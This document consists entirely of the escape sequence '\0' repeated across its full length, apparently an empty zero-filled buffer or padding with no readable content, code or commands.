\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0